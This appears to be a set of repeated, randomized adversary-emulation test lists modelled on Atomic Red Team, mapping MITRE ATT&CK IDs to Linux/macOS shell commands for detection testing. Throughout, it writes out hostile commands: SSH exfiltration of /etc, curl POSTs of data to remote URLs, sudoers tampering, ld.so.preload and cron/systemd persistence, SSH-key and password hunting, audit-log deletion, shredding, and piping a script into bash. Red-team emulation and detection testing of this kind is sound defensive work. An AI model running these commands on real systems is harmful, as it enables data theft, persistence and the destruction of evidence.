Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1501 ,T1064 ,T1145 ,T1201 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1215 ,T1154 ,T1081 ,T1135 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1168 ,T1064 ,T1139 ,T1057 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1064 ,T1145 ,T1069 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1069: Permission Groups Discovery
groups


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1136 ,T1154 ,T1139 ,T1217 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1136 ,T1153 ,T1145 ,T1135 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1501 ,T1153 ,T1040 ,T1087 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1168 ,T1154 ,T1040 ,T1083 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1501 ,T1153 ,T1081 ,T1217 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1158 ,T1154 ,T1145 ,T1018 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1168 ,T1153 ,T1139 ,T1087 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1168 ,T1153 ,T1145 ,T1201 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1136 ,T1154 ,T1145 ,T1083 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1158 ,T1064 ,T1040 ,T1083 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


